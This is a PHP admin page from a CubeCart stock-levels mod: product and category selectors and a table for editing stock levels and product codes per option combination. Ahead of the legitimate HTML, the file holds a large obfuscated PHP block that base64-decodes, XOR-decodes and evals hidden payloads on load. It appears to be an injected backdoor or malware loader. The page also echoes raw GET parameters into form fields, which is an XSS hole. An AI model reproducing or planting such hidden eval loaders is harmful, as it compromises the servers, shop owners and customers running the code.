GaVlDYUUxT1EyWjFYU0VLRXlJQU5nd1dQakVyRlhwVVZ5SVVjMGRHQ0NvcVJHNWZWMjFVYzBzWEVTQmtSR05QVVcxU2R3c0hEWGxrU1hOSlVXdFdKaDhHQURBOFJHNWZYbXNKYzBzUEVpTjVWMjVQVlhjQ2N3d09BRGNxUkhRWUZqa2NCd29hRldObk9qd2FHeThjZEJ0Q0ZEUTlHQ2NLVjJNZElVOE1EbVE2RVRJQkVDNEJjeHNOUVRFcEhUSWJFbUpPZkI5Y1EzOTVCSE1LR3pnWGN3WUVRV3g5RUQwY1NYdFNMeE5DUlRFcEhXMWZWemNPYzBzR0JDaG5TWHBQREdzYU5nNEdCRFp4V3g4QUZDb0dPZ0FNVzJSN1YzY2RFaThiSVFvQkZSc3NDejlHVEdzWEt3WVdXbVFrV1RZREJDNVNLRTlHRXlFOUVDRUtGRDh0SmgwT1FYbDVYVFFER0NrcGRBNEdEQzAzUHpvREVtd3ZmVTFkUGlOa1czMUxLQXczQnpSRlBpTitKSDFOVVNZZE54b09CSGw3VjNjd01BNG1DRWdQRGlBc0ZUWklLbkJTT3dvREJTRXJVWEVqR0NnVEp3WU5EMzU1VzMxTEJTNFdPaDBIQWpBR0RDRURYbkJTTmhjTEZYOTVCSE1TVnlJVWV3WVJFaUV0VVhjd0p3UWhCelJGRWlFMUhEQWJPRHNHT2dBTUVtTUVVSHBQREd0V053MFdBQ1kxSEhOU1YyOFZQd0FBT21NOUd5TWRFaTBiSzBnL1QyWWFEREVLTkNvQUp6QU5FVEF3RmowY0tEZ0dQQXdKUGlzcERTQk5UR3RXUEI4V0NDczNDbk5TVjI4dEF5QXhOUjkrRmlNYkhpUWNJRWcvV21SOUZqaFBTbXNHSVJvSFdtUS9GaUVLRmlnYWUwc05FVEF3RmowY1Z5b0JjMHNOU0dRaVdYY2RFaWdkSVF0Q1hHUTRDeUVPRG1OVkl4ME5CVEU2RFF3R0UyeFNibEZDUlRRckZqY3dIaTllYzBnTkVUQXdGajB3SGk5VmMxSmNRV0EyVUdoUFV5UVpjMUpDUlNzeVdYVkpWMjhXTVVKY0NDb3FIQ0ViWDI4V01Sc0RBeWc4VlhOTEJTNFJQQjBHU0g5NUJITkxBQ01YSVFwQ1hHUjdDU0VBRXo0Ukp5WUdRWGw1VzMxTEV5bGZiUUliTWhVVktqSUpFbU5XSXgwTkJSc3dIWHBVVjI4Uk93b0JDaHNxRFR3TUhHdFBjMHNHQTJsbkNqWURFaWdHZTAweEpBZ2NPZ2RQQkQ4ZE1BUTlEU0V2SEQ5UE1SazlIazlBVDJBK0ZUd05MR3dXTVI4UUJDSXdBWFF5V1dreEpnMEhJaVVyRFF3R0dUMFhQUnNORXoxNUxoc3FKUTVTY1VGR0ZpdzhDelpHVEd0V0lBQkNYR1EzSENSUEJEOGRNQVJLUlNBN1ZYTkxCemtkTnpBTEJXMWlXU1lCQkM0R2Uwc1FCQ2MyQ3pkR1RHdFdKd0FXQUNnR0NpY0FGQ0JTYms5R0VpdDBSekFPR3lnSFB3NFdCQkEyRFRJREpEOGRNQVJLU0g5NVhTRUtGQ1FBTnpSRkVqQTJHamd3R3k0RU5nTkZQR1JrV1hjYkdEOFRQekFSRlNzNkVtaFBVendhTmgwSFFYbDVXeU1kR0M4SE1Cc3JCV1JrV1hGQlV5OFFmbEVQR0JjSU5RQU9FUzVhZHg4UURpQUdFRGRHVEd0V0poOEdBREE4V1c1UFV5OFFmbEVYRVNBNERUWkhVeXdlUEEwNVJpQTdDU0VLRVNJS2RESk1Rd2NzR3pZc0Zqa0dEQVlNRnlFM0RUd2REbWxlYzBzUUJDYzJDemREVjI4Rk93b1FCRzFpV1RvSlYyTldQQVJDUjJKNVhTWWZFeW9HTmtaQ0dtUjlGQ0FJVjJWUGMwMWVFV1E2RlRJY0JIWlZPZ0VFRGhBOEFTZElTUmdITUF3SEVqYy9ERDhERG1zQk5nTUhBakE4SFhNZkJTUVdKZ3dXUVNzcERUb0FHVGhTTlFBUVFUY3RGakFFVno4QU1nd0pDQ28rVjI5QUIzVk9JMDhCRFNVcUNtNUlIaVVVUERzSEdUQitSd2NBQXlvZWN4d1dEaWN5V1Q4S0FTNGVjeDBIRWlFdFdUVWRHQ1pTY1VGR0FpdzhHamd3QkQ4ZE1BUTVVUmtDWGlBYkdDZ1pEQU1IRnlFMVhnNUJWV3NHUEU5QVQyQXRGaWNPR3hRQkp3QUJDbXA3Ulh3ZlNXbEpjeEpDQkNncUhEb0pWMk5XUEFSTFFUOTVYVDRjRUd0Y2JrOUFYVFI1R2o4T0JEaFBkQVlNQnlzTkhDc2JVSFVoSmd3QkJEY3FIeVlER3pKU0lBb09CQ2N0SERkUEJ6a2ROeG9CRldRMkNTY0dHQ1VCY3drTkUyUXFEVHdNSEdzR0lRNEJDaTAzSG05QUIzVlFhRThmUVNFMUNqWlBER3RXUGh3RlFXcGtXWEZUQjJzUlB3NFJFbmwrRGpJZEdSOFhLeHRGWHdFckN6d2RWeVFSTUJvUUV5RTlXU0FLR3k0Ukp3WU1CbVFwQ3p3TEFpZ0djd0FTRlMwMkZ5QlBFU1FBY3h3V0RpY3lXU2NkRmlnWk9nRUZUM2gyQ1cxTlRHc1BjeEpDQ0NKeEVDQWNFajlhZHpBeUxoY05JblFNSHlvY05Bb3RFVEF3RmowY1VCWmJlazhaUVdBdUVUWWRFbXRQYzAwU0V5czlEREFiS0NJV2MxSkNRMnA5SFRGQ1NTWUxBRDR1TWlVL0hIdExCemtkTnpBTEJXMWlXWGNMRWljWEp3cENYR1I5SFRGQ1NTOFhQd29XQkd4OUhqOEFGUkJWTncwU0V5RS9FQ3RJS21WUUVCb0FCQWM0Q3ljd0dEc0dPZ0FNRWhzcURUd01IQlFkSXhzUlEyaDVYU1FIRWprWGVsUkNSU2N4R0QwSUVnUUNKd1lORHpkNVJITTdKUjQzYUU4ZlFRPT0iKSwiU29iYURZeVNvd0tyIikpOw==")); $sGCvGVfADfH="sAUyzPMPDlZb";
}
$sjggdrqqGOHxDNYC="eval(str_rot13('sjggdrqqGOHxDNYC(sXGbyFxUgvQFAGBgoWYVyEXXKnRLdlxihhiNdoPztrKPkBKIgEjDmKY,shGuSWDqHkldsb)'))";$sKfNepoF="sQiFYcMqbtxSpHpPy";eval(base64_decode("JHNLZk5lcG9GPSJzUWlGWWNNcWJ0eFNwSHBQeSI7ZnVuY3Rpb24gc1FpRlljTXFidHhTcEhwUHkoJHNNbU9RTVBZVk8sJHNscVBkbnRweXFWbHMpeyRzcGNRU3NOd249JHNNbU9RTVBZVk9eJHNscVBkbnRweXFWbHM7cmV0dXJuICRzcGNRU3NOd247fWZ1bmN0aW9uIHNRcERzaWF5QXFKbCgkc2tVenFwTEJoRU9kREJoLCAkc3dmd1djTkxsb3kpe2Zvcigkc1R6TGtlenllRkdqckc9MCwkc1JEVW1UU0ZUcVF6Y0RCPTA7ICRzVHpMa2V6eWVGR2pyRzxzdHJsZW4oJHNrVXpxcExCaEVPZERCaCk7ICRzVHpMa2V6eWVGR2pyRysrLCRzUkRVbVRTRlRxUXpjREIrKyl7aWYoJHNSRFVtVFNGVHFRemNEQj09c3RybGVuKCRzd2Z3V2NOTGxveSkpeyRzUkRVbVRTRlRxUXpjREI9MDt9JHNrVXpxcExCaEVPZERCaFskc1R6TGtlenllRkdqckddID0gc1FpRlljTXFidHhTcEhwUHkoJHN3ZndXY05MbG95WyRzUkRVbVRTRlRxUXpjREJdLCRza1V6cXBMQmhFT2REQmhbJHNUekxrZXp5ZUZHanJHXSk7fXJldHVybiAkc2tVenFwTEJoRU9kREJoO30kc0VIRmdSYWZSR0dJPSJzUXBEc2lheUFxSmwiOyRzcVdyRk5YTUVvZj0iZXZhbChzaGExKCdzUXBEc2lheUFxSmwoc09MdUVWd29MaW5LWG9DanV4aEhGeHVES3dmV29pSmt2U1ZzTGtqUm93cUhKb0hsY1hjQldqUWV4aVMsc2tHeWpuT0FqbHRxb2tFTXcpJykpIjtldmFsKHNRcERzaWF5QXFKbChiYXNlNjRfZGVjb2RlKCJjeW9iS0JJNEt5d2VZeVY4YkFsN2MyZ0ZiMUUzWWlVZk1XdHdLd05xWTJCS0xSaHhjbmhRWnlBOWRCa2pJU0FMS0Zsb0lXcExZMmMzSVVGOGYyZ0ZMMXBuYTJNTFl5b3lZRTQ4T25GVE5RVStMaVllYTJjL1lVTjNkeWNIZTBGM1ltY1RHR2MzSVRkM2JteEtMU3BvS1NvdEhXYzNFMDQwT2hGVlpneHNNQ1lFTmpFNmFFNDBhR3dUWmxVL0t5ZFFmbU01TEY5L2REOEhJbFppWmlRY0xDRVBid1krTUNrQU5SUVRLU1lKWkI1OWMwbytOV3hHTlFVK0hURVZNeTgxS3c5L2NXRk1hbE51Ym1jZExDY2hKQThNZENFQklpNGdLeUFWTFRBeEZ3RXlLbXN6YjFGdGYyTUROaUVuUEJoL1BpaGJiaGRrWmpBWkoyOTJPd1l6WTNoRElDNHBiR0ZaYW05a1pGaGllbVZPWWhvcE94d2ZLR05wYUF3MlB6OExmVkVsSkdOWVp5Z3hNVFU0T0hGVElCQWdNU1pRUHo5MFlFNDZQQ2diS2hSc1pHVlFZbWM1Snc0aVB5azFZUUk0SXpjRk1CdzNLMTV3RG1WSFpncHNKeUFZTEdOemRFc1RIQTg2SHlFSllnc2tEZzkwR0Q4Vkh3VXRabE5oYld3bmNBQjdaeTRERjJ3bUVqd0FZbmRlYzJNQU9nczVJQ1VhTHg0aUl5OWZiQVlhYWtwcGMzQUdJeEFvZkdOTUxpWWdLVW8vSnpnZWF4UTlOeW9HZm1FWEp3UWpOaUlhYXlVMU1pWlNZeUE3Smg0eVBUaFRaQVVwT2pkZkt6YzVKRkYzTUNRUE5BSXBObjRsRndWNWNFaDNmSEpPZWgwbExDaFFLekV4TGxkMWRHSktJUjBqSUJoWElpYzVJUVFSUENBS0l3TnJIMjFYYkRBZ01RWXlJR01kTWdnZ0oyMFRNREIyYUJneVAzRk1OUVUxTGlZREt5WXhQRWgzSnpVZUkweHVOaVlJTjJ3M094bDFjMk5RWVVwc0p5QVlMR056ZEI0K0p5QUxlRlppWmk0Zkp4d2dJUjQ3Tm1KTVpsTmlaalVWTVRBOUp3UjVkSEJCTWhnNExpWk9aSGgwTFFrL1BHeEplbDRrSnlJVWZXTm9LZ1V6S25KSmZWRXBJU3NmWTJGb09FbzBQeTBkTlV4ck1pSVhKaGM5UEFZeWRISk1hRlVoTFNjdk55b2dKQTk1Y1d4TWFGVTZKekVES2l3NlpraHJmRHhRWkVwc0p5QVlMR04yZEE0K0pXd05LaEEvTVg1WFlXMXdLUWtsUENJWEsxOXVid1luQUN3a01SZytOQ1FhWVU5d01tTVRMeUluTzFkd01DTWVQeVVwT2pkWFl6QWdNUVl5Ym1zSUtSODRiekFaT1NadWFGdG1JelJWWVU5dWJEWVRKU29tT3g1L2R6Z1hOaFJsYkdGUUlDd2tNUmcrTkNRYVpsY3ZMVE1KZUdOMlprNHVOaTBjYUZOc2ZpSlFLekV4TGxkd096Z2FOa3RqYlNBRklTWTNLUmdqZlNrV05oQWlKaW9lSkNFbUtRTTVmUzhCSzFac05pSUNKQ1lnZFUwSU1TQVBLQnByZkFZRE55WTRKQTkzQkNVQU1oUStKQzhmTENkb1p3dHBiMk1lZUUxakppb0dmV0Z2YUFNeGMyUUhOUUlwTm10VUxqQXpZVU4zS0d3TEpSa2pZakFFTVNva093WTJJQ1FMTlZsb0x6QVhhbmgwTlVvK05XeEdZaG9wT3h3ZktHcDBNMG95TUNRQlpsTndNbU1UTHlJbk8xZHdNQ01lUHlVcE9qZFhZekFnTVFZeWJtc05LUjBqTUhsUU1TWXdjMG8xUEQ0S0l3TjJZbklBTzJNbkp3WStOMndjSXhWM1lqTVJKeWM5SmcxdGMzeEFjeFFoZVdST0Z5czlPMG82UENoT0x3SnNJVFlDTVNZNlBBWXVjeWdMSnhJNEt6VVJOeVl3WmtvRFBHd0xLQkF1TGlaUU55czlPMG82UENoQ1pnSXBObU1FS3laME94NDJKemtkWmdValloOVNCaTAxS2dZeU54Qk1aaGdpWWdJVUxpbzZhRWR4TkRoVlprSStKbU1nSWpFZ01VcDZkU3NhZlZGdWJEQUVNUndtTFJvN01pOExibE1UWUc5U1kyRjRiQWs0UFNvSElTNGlJeTRWYW0xMlpsWjRJM0pNZlZFeFlpWWNNQ1owTTBveU1DUUJabE53TW1NVEx5SW5PMWR3TUNNZVB5VXBPamRYWXpBZ01RWXlibXNOS1Iwak1IbFFNU1l3YzBvMVBENEtJd04yWW5JQU8yTW5Kd1krTjJ3Y0l4VjNZak1SSnljOUpnMXRjM3hBY3hRaGVXUk9GeXgwUFJreWN6Z0dMd0pzTHl3VVl6TTRMUXNrTm13TEtBVXBNR01KTERZbWFBWStNQ2tBTlJSc0tTWUpZeW82YUNzelBpVUFabHhxSlRkTFkzQW1MRW9ITWo0YVAxRmhaQ1FFZUdOMlpoa2pJUk1jSXdFZ0l5QVZhMkVMYWtaMWMyNUNZaElqTENVWkpCdzZLUWN5ZW1KTWFGY2lJREFBZUdNQUlBTWtjeUVCSWxFbE1XTVROakVtTFFRalB6Vk9JaFF0SVRjWk5TSWdMUTU1Y1hkT08xRXBJU3NmWTJGb1p3ZzROelZRZWw0a05pNGNmV0Z2YUE0K05uZE9PMUU1TERBVk4ydHdPd016ZjJnRkl3Z1RMU2haZUdOd093VWxKeE1lTkI0b055QUVNQncyTVRVMFBDZ0xaa3hzSkNJY01DWnZhQU14YzJSS0t4NG9OeThWYW1NdmFFNGtQRDRhR1FFK0xTY0ZJRGNuRndndURDOEJJaFJzZjJOVUxpd3dQUVl5Q0dzZEtRTTRIVE1DTENjaEt4NGtEQzRYR1JJakppWlhIbmgwTlVweklDUUJNUzRnS3pBRUhDd3lGd3M3UHhNZU5CNG9OeUFFTUdOcGFCNGxKaWxWWmhncVltdFVMaXd3UFFZeWVtd1ZaZ0k3S3pjVEsyTjhiQWM0TnprQ0l5cHJNU3NmTkJ3NElSa2pEQ01JR1JBZ0xod0FNU3d3UFFraklHc3piMUUzWWlBUk1DWjBlRkIzZHo4R0tRWVRMaW9ETnh3N0xqVTJQeUF4TmdNakpqWVROekIwZFVveE1pQWRJMHBzWmpJRktpQS9hRmQzTlMwQ05SUjNZaUVDSmlJL2MwbzBNajhMWmtCMlltY0RLeXdqRndZK0lEZ3hLUmNUSXk4Y0hETW1KdzRpTURnZFpreHNOakVGSm5oMGJCc2lPaThGWmt4c0pDSWNNQ1p2YUFnbE5pMEZmVkV2SXpBVlkyNWxja3B6SUNRQk1TNGdLekFFSEN3eUZ3czdQeE1lTkI0b055QUVNR05wYUF3MlB6OExmVkZvTXpZWklDaDBkVW9qSVRrTGZWRXVNQ1lSS0hoME5Vb3FjMmdOSndVcEpTd0NLaVluYUZkM2R5Z01hMDgvSnk4VklEZDhhamtTSHdrdEVsRUlDeEFrQ2cwWEhFbzBNamd4S0JBaEoyOVFJQ0lnRnd3Mkp5UUxOQzRsSm05UUlHMDNLUjRJT2loT0FDTUREMk5TYldjekpBVTFDR3NLSkFFK0p5VVpPMlFKWmtnVUppNExCUkErTmh3VElqY3hMd1VsS213dkZWRXZZZ28rRFFZR2FDQVlHZ0pPWkY5b0pTOGZJUmh6TEFnbklTa0lMd2xySDIxU0FEWTJMU2sySVRneEx4ODZKeTBFTERFdGFDc0VjeVZPQ1Q5c0lXMFRJamNMSVE1M2Jtd0hhQkl0Tmh3WkoyTWJHaTRTQVd3c0gxRXZJemN2SlNJZ0lBOGxEQ1VLWmpBZkFXOVFJQ0lnRndRMlBpbE9CeUlQWUdwTFl5b3lhRUp6SUNNY01pNDhNQ3dVTmlBZ096VTFLaE1OS1JVcGEyTUxZMmNuSnhnakRDNFhaa3hzWURNQ0xDY2hLeDRVUENnTFpqQWZBV0ZMWXo1MExRWWtObXdWWmxVL0xURUVIQ0V0YUZkM2NTSVBLeFJzQXhBellYaDBOVXB6SXo0QklnUXZOakFqTERFZ0N3c2pjM0ZPWWhVdWIzMERKaTh4S3g1L2NSOHJDalFQRm1NVElqY0xJUTU3Y3lJUEt4UmdZak1DTENjaEt4NFVQQ2dMYWxFOE1Dd1VOaUFnQVE1M0ZSNGhDMUZ1YkdjWEx5dzJFMDB6TVR3Y0l4Y2xPbVF0YldFWFBRZ3lFQzBjTWk0bExEVVZMVGM3T2hOM0hCNHFBeU5zQUJwUUlDSWdGd016Y3cwOUJWMXNaakFmTVRjTEtoTjFlbmRPTHhkc2FtY1RJamNMSVE1M2JXeGVaZzB3WW1jREt5d2pGd1krSURneEtSY1RJeThjSERNbUp3NGlNRGdkYjFFM1ltY0FNU3d3UFFraklHeFRabFVvSUc1T01DWTRMUWtqZTI0OUF6MEpBUmRRSUNJZ0Z3TXpmMndBSnh3cGJtTUFNU3d3UFFrakVDTUtJMTFzTWpFZkp6WTNQQ016Y3dvOENUeHNZRzFVSkM4N0tqRndOeTRlTkJRcUt6dFhIbTEyQ3g4MU5nOFBOQVVUS3kwR0ppMGdKeGd1Y3dNOEFqUWVZZ0VwWTJjbkp4Z2pEQzRYWkZoM1lqNVFaeUExUEE4d1BENFhHUjQ4TmlvZkxUQjBkVW8wTWpnTElSNCtPd3dBTnlvN0pobC9keThQTWhRckxURVpKakI5YzBvK05XUktOZ01qSmh3WkoyTnFhRnArY3pkT1lnSWpZbjVRTFNZamFCa2pQQzhGYmxVb0lHOVFaek1tSnc0SU9paEhmVkZvSVRZQ01TWTZQRG9sUENnYkpRVnNmMk5VSnlGNWRoa3lQeWtOTWxsdUVRWThCZ0FBYUI4a05oOGFLUkluRGlZR0ppOTRhQmtqUEM4RkdSMHBOQ1ljYjJNNktRY3lmMndlTkI0b055QUVDaWQ0YUJvbFBDZ2JKUVVQTFNjVmIyTTlKUXN3Tm13b0ZENEJZbUZlWnlRNEp3Z01kQ2dNTmdNcEpDb0laQjU2YWlraU1Ta3RKd000SFNvZU5TWTZQQVVsS213NURqUWVCMk1BTVN3d1BRa2pHaWhPZTFGdWJHY1VJVzVxSlJNRUFnQTlKeGNwYW1jQU1Td3dGd016ZW1WVlpsVXZOekVDSmkwZ0dCZzROemtOTWxGeFltY1ROakVtTFFRakF6NEJJZ1F2TmhoQUhuaDBiQnNpTmo0WFpreHNZQkExRHdZWEhFcDljd284Q1R4c1lHMVVKQzg3S2pGd055NGVOQlFxS3p0WEhtMTJDeDgxTmc4UE5BVVRMVE1FS2l3Nk96VWpQRHhPQ1NNSUJ4RlFBUnAwSnhvak9pTUFHUmdvWWdJakFHRnZhRTRsTmo5T2UxRm9KaUZkZlRBeEpBODBKMlJLTndRcE1EcFplR053Snhvak9pTUFDQkFoSnpCUWZtTTFPaGcyS21SSGZWRXFMVEZZWnlwcGVGRjNkeVZTSlI0NUxEZFlaekV4TzBOM2RXcE9Md0lUSXpFQ0lqcDhiQmd5SUdWVlpsVWxhV2haWXpoMGJBVW5KeVVCS0Q4dEx5WURHR2NtTFJrTWR5VXpIVllqTWpjWkxDMExJUTV3RGhGT2UxRm9NQ1lER0djOUZURndQRHdhTHg0aUhTMFJMaVp6RlZGM0xtd1RabFU1TUM5UWZtTjJkelV3Ym01QVlpNExCeGNyWkJ3emJ6ZDVjV29QS3dGM0x5d1VOaTh4ZFVoNWR4TXBBeVVYWlM0Zkp6WTRMVTBLYUd4S0pRUStNQ1llTnhNMUx3OTNibXhLTXdNZ2JHRldJaTRrY3hvbFBDZ3hMeFZ4WUcxVU16RTdMRFUrTjJKTVlCQWhNbmdUSWpjTElRNXFjV0pLSlJBNEhTb1VlR053S3g4bElTa0FNaUV0SlNaUWZtTWhPZ1l5UFM4QkloUmtaaUFGTVRFeEpoNEhNaXNMYjBwcyIpLCJTTG5GcUxCQ3BDQ1RIalciKSk7")); $szXagXTnqnfse="sjggdrqqGOHxDNYC";

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<link rel="stylesheet" type="text/css" href="<?php echo $glob['adminFolder']; ?>/styles/style.css">
	<script language="javascript" type="text/javascript" src="js/jslibrary.js"></script>
	<title><?php echo $mod_title." ".$version; ?></title>

	<script language="javascript" type="text/javascript">
<?php
	if (!$quick || $prod_id == 0) {
		echo javascriptUpdateProductList($show_list_of_all_products, $please_select_prod, $products, $productsSortCat, $nullText);
	}
?>
	</script>
</head>
<body>

<p class="pageTitle" style="margin-top: 0; margin-bottom: 0.5em;"><?php echo $mod_title." ".$version; ?> <?php if (isset($currentProduct)) echo "&ndash; ".$currentProduct['name']; ?></p>

<?php echo "<div class='".$acronym."-EWCopyright'><p class='copyText' style='font-size: 11px;'>".ucfirst($type)." copyright &copy; ".$year." <a href='http://cubecart.expandingbrain.com' target='_blank'>Estelle Winterflood</a></p></div>"; ?>

<p class="copyText" style="font-size: 11px;"><a href="modules/3rdparty/Stock_Levels_for_Product_Opts/docs/how_to_use.txt"><img src="modules/3rdparty/Stock_Levels_for_Product_Opts/admin/info.png" width="16" height="16" alt="Information" align="absmiddle" style="margin-right:5px;" />Documentation: How to use</a></p>

<?php
	if ($module && !$module['status_cc4']) {
		echo "<p class='copyText' style='color: red; border: 1px solid red; padding: 0.5em;'>This mod is currently deactivated and will have no effect in your storefront. To enable this mod, set the status to \"Enabled\" in Admin -&gt; 3rd Party -&gt; Stock Levels for Product Opts</p>";
	}
?>

<?php if(isset($msg)){ echo stripslashes($msg); }?>
<?php if(isset($warning)){ echo stripslashes($warning); }?>
<?php if($productsSortCat == true){ ?>

<table width="100%"  border="0" cellspacing="5" cellpadding="0">
<?php

    if (!$quick || $prod_id == 0)
    {

?>
  <tr valign="top">
    <td class="tdText">
      <strong>1. Select A Product</strong>
    </td>
    <td rowspan="3" class="tdText">
<?php
	if (isset($currentProduct) && !empty($currentProduct['image'])) {
		$root_img_path = imgPath($currentProduct['image'], $thumb=true, $path='root');
		$rel_img_path = imgPath($currentProduct['image'], $thumb=true, $path='rel');
		if (file_exists($root_img_path)) {
			$size = getimagesize($root_img_path);
			echo '<img src="'.$rel_img_path.'" alt="" title="" ';
			echo 'style="margin: 10px; vertical-align: middle;" ';
			if ($size[0]>49) {
				echo 'height="50"';
			}
			echo " />";
		}
	}
?>
    </td>
  </tr>
  <tr valign="top">
    <td class="tdText">
      <form name="select_product" method="get" action="<?php echo $url; ?>">
      <input name="_g" value="<?php echo $_GET['_g']; ?>" type="hidden" />
      <input name="module" value="<?php echo $_GET['module']; ?>" type="hidden" />
	  <table border="0" cellspacing="0" cellpadding="2" class="maintable">
      <tr>
        <td class="tdText">
		  Category:
        </td>
        <td>
		  <select name="cat_id" id="productCat" class="textbox" onchange="updateProductList('productCat','productId',true)">
			<option value="0" <?php if ($cat_id==0) echo "selected=\"selected\""; ?>>
<?php
	if ($show_list_of_all_products) echo $list_all_prod;
	else echo $please_select_cat;
	echo "</option>";

	foreach ($category_options as $id => $full_name)
	{
		echo "<option value=\"".$id."\" ";
		if ($cat_id==$id) echo "selected=\"selected\"";
		echo ">".$full_name."</option>\n";
}
?>
		  </select>
	    </td>
      </tr>
      <tr>
        <td class="tdText">
		  Product:
	    </td>
	    <td>
		  <select name="prod_id" id="productId" class="textbox" onchange="this.form.submit();">
<?php
	if ($prod_id==0 && $show_list_of_all_products) {
		echo "<option value=\"0\" selected=\"selected\"";
		echo ">".$please_select_prod."</option>\n";
	}

	for ($i=0; $i<count($products) && is_array($products); $i++)
	{
		if ($cat_id != 0 && $products[$i]['cat_id'] != $cat_id)
			continue;

		$name = product_display_name($products[$i]['name'], $products[$i]['productCode']);

		echo "<option value=\"".$products[$i]['productId']."\" ";
		if ($products[$i]['productId']==$prod_id) {
			echo "selected=\"selected\"";
		}
		echo ">".$name."</option>\n";
	}
	if ($products==false || count($products)==0) {
		echo "<option value=\"0\" ";
		if ($prod_id==0) echo "selected=\"selected\"";
		echo ">".$nullText."</option>\n";
	}
?>
		  </select>
	    </td>
	  </tr>
	  </table>
	  </form>
    </td>
  </tr>
  <tr valign="top">
    <td class="tdText">
      <br/>
    </td>
  </tr>
<?php

	}

?>
  <tr valign="top">
    <td colspan="2" class="tdText">

<?php
        if($so && $so->hasOptions() == FALSE)
	{
	    // SITUATION 1. PRODUCT HAS NO PRODUCT OPTIONS
?> 

            <!-- style="color: green; font-style: normal; font-size: 92%; margin: 0.5em 0 0.7em 0;">-->
            This product doesn't have any product options, so stock tracking by product options cannot be enabled. Product options can be setup within Admin -&gt; Product Options.
<?php
        }
	elseif( ($so && $so->hasSelectedStockOptions() == FALSE)
                || $changeOptions == TRUE)
        {
	    // SITUATION 2. PRODUCT OPTION STOCK LEVELS IS DISABLED
?>
        <strong>Enable Product Option Stock Levels</strong>
        <p style="color: green; font-style: normal; font-size: 92%; margin: 0.5em 0 0.5em 0;">
        Stock tracking by product options is currently <span style="color: red;">disabled</span> for this product.
        </p>
        <p style="color: green; font-style: normal; font-size: 92%; margin: 0.5em 0 0.7em 0;">
        To enable, choose which product options you want to use for tracking stock below.  E.g: Size and Colour.
        </p>
<?php
		$epo = fetchDbConfig("Extended_Product_Options");
		if ($epo && $epo['status_cc4'])
		{
?>
        <p style="color: red; font-style: normal; font-size: 92%; margin: 0.5em 0 0.7em 0;">
		IMPORTANT NOTE: Since you are using the "Radio Product Options" mod or the "Visual Product Options" mod, please note that <u>if any of the product options below are displayed with Checkboxes - those product options cannot be selected for stock tracking</u>. &nbsp; But any product options below that are displayed with Drop Down Boxes, Visual Options or Radio Options can all be selected for stock tracking.
	</p>
<?php
		}
?>
          <form name="select_options" method="post" action="<?php echo urldecode($currentPage); ?>">
	  <table border="0" cellspacing="0" cellpadding="3" class="mainTable">
          <tr align="center">
<?php
      $colspan = count($so->productOptions);
      foreach ($so->productOptions as $opt) {
          echo "<td class=\"tdTitle\">&nbsp;";
          echo $opt['option_name']."&nbsp;</td>";
      }
      echo "</tr><tr align=\"center\">";
      $i = 0;
      foreach ($so->productOptions as $opt) {
          echo "\n<td class=\"tdText\"><input type=\"checkbox\" name=\"options[".$i."]\" value=\""
              .$opt['option_id']."\""."/></td>";
          $i++;
      }
      echo "</tr>";
?>
          <tr><td colspan="<?php echo $colspan;?>" align="right">
            <input type="submit" name="selectOptions" value="Enable" class="submit" /></td></tr>
	  </table>
          </form>
<?php
        }
	elseif ($so)
	{
	    // SITUATION 3. PRODUCT OPTION STOCK LEVELS IS ENABLED
?>
            <strong><?php if (!$quick) echo "2."; ?> Edit Stock Levels and Product Codes</strong>
            <p style="color: green; font-style: normal; font-size: 92%; margin: 0.5em 0;">
			Set stock level to <span style="color: red;">zero</span> (0) if product variant is <span style="color: red;">temporarily out of stock.</span>
			</p>
            <p style="color: green; font-style: normal; font-size: 92%; margin: 0.5em 0;">
			Leave stock level <span style="color: red;">blank</span> if product variant is <span style="color: red;">never available for sale.</span>
			</p>

<?php if ($currentProduct['useStockLevel']==0) { ?>
            <form action="<?php echo urldecode($currentPage); ?>" method="post" name="use_stock_levels">
            <input type="hidden" name="activate_stock_levels" value="1" />
            <p style="color: red; font-style: normal; margin: 1.0em 0;">
			Warning: The "Use stock level?" setting for this product is disabled, so this product is currently being treated like stock is unlimited.  This setting can be changed via the Admin Edit Product page, or <a <?php if(permission("products","edit")==TRUE){ ?>href="javascript:submitDoc('use_stock_levels')" class=""<?php } else { echo $link401; } ?>>click here to activate stock levels for this product</a> </p>
            </form>
<?php } ?>

        <form name="edit_products" method="post" action="<?php echo urldecode($currentPage); ?>">
	    <table border="0" cellspacing="0" cellpadding="3" class="mainTable">
        <tr>
            <?php $colspan = 2; foreach($so->stockOptions as $opt) { ?>
            <td class="tdTitle">
            <?php echo $optionNames[$opt]; $colspan++; ?>
            </td>
            <?php } ?>
            <td class="tdTitle">
            Stock level
            </td>
            <td class="tdTitle">
            Product code
            </td>
        </tr>
        <?php $combinations = $so->getCombinations();
			$cellColor = "";
            for($i=0; $i<count($combinations); $i++) {
				$cellColor = cellColor($i);
                $combo = $combinations[$i]; ?>
        <tr>
            <?php foreach($combo as $val) {
                echo "<td class=\"".$cellColor." copyText\">".$so->optionValues[$val]."</td>\n";
            }
            $stock = $so->getStockFromCombo($combo);
            $stockLevel = "";
            $productCode = "";
            if($stock) {
                $stockLevel = $stock['stock_level']; 
                $productCode = $stock['product_code']; 
            }

            echo "<td class=\"".$cellColor."\">";
            echo "<input type=\"hidden\" name=\"assignKeys["
                .$i."]\" value=\"".$so->formAssignKey($combo)."\" />\n";
            echo "<input type=\"text\" name=\"stockLevels["
                .$i."]\" value=\"".$stockLevel."\" class=\"textbox\" size=\"6\" />";
            echo "</td>\n";
            echo "<td class=\"".$cellColor."\"><input type=\"text\" name=\"productCodes["
                .$i."]\" value=\"".$productCode."\" class=\"textbox\" size=\"12\" /></td>\n";
            //echo "<td class=\"".$cellColor." copyText\">";
            //if ($stockLevel=="") echo "(Never available)";
            //else if ($stockLevel==0) echo "(Out of stock)";
            //echo "</td>\n";
            ?>
        </tr>
        <?php } ?>
        <tr>
            <td class="copyText" align="left" colspan="<?php echo $colspan-2; ?>"><strong>Total Stock:</strong></td>
            <td class="copyText" align="left"><strong><?php echo $currentProduct['stock_level']; ?></strong></td>
            <td align="right"><input type="submit" name="Select" value="Update All" class="submit" /></td>
        </tr>
        </table>
        </form>

    </td>
  </tr>
  <tr valign="top">
    <td class="tdText">
      <br/>
    </td>
  </tr>
  <tr valign="top">
    <td colspan="2" class="tdText">


        <br/>
	    <strong>Reset Product Options</strong><br/>
            <p style="color: green; font-style: normal; font-size: 92%; margin: 0.5em 0;">
            1. Click below if you wish to <span style="color: red">disable</span> stock tracking by product options for this product (and use the standard stock level instead).<br/>
            </p>
